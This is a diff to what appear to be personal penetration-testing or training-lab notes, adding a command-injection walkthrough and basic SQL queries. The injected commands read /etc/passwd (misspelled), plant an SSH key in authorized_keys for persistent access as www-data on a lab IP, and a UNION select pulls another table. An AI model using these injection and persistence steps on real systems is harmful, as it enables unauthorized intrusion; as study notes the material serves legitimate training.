@@ -25,3 +25,33 @@ site: marines.mil filetype:pdf "covid 19"
  
 # Recon 
 for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+
+# Web Exploitation
+
+-command injection
+(home box)
+  ssh-keygen -t rsa
+  cat .ssh/id_rsa.pub
+(Target)
+  ; whoami
+  ; cat /ect/passwd
+  ; ls -la /var/www
+  ; mkdir /var/www/.ssh
+  ; echo "id_rsa.pub" > /var/www/.ssh/authorized_keys
+  ; cat /var/www/.ssh/authorized_keys
+(home)
+  ssh www-data@10.50.31.75
+
+  ls -la /var/www/html
+  
+# sql
+
+mysql
+show databases;
+show tables from session;
+select * from session.car;
+use session;
+select * from car;
+describe car;
+select * from car UNION select tireid,name,size,cost,1,2 FROM Tires;
+  
